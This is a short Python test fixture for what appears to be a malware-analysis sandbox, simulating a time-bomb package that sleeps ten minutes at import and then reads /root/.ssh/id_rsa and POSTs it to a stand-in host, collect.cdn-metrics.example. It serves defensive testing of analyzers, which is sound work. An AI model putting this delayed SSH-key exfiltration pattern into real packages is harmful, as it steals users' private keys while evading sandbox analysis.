# SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only fake canary files
# Simulated time-bomb: sleeps for 10 minutes at import before behaving like
# naive-stealer. An analyzer needs a time shim (mocked/fast-forwarded sleep) to
# observe the post-sleep behaviour inside a single analysis round; without one
# this import simply blocks and the round should be marked inconclusive.
import time
import urllib.request

time.sleep(600)

_SSH_KEY_PATH = "/root/.ssh/id_rsa"
_C2_URL = "http://collect.cdn-metrics.example/u"

try:
    with open(_SSH_KEY_PATH, "rb") as _f:
        _data = _f.read()
    _req = urllib.request.Request(_C2_URL, data=_data, method="POST")
    urllib.request.urlopen(_req, timeout=3)
except Exception:
    pass
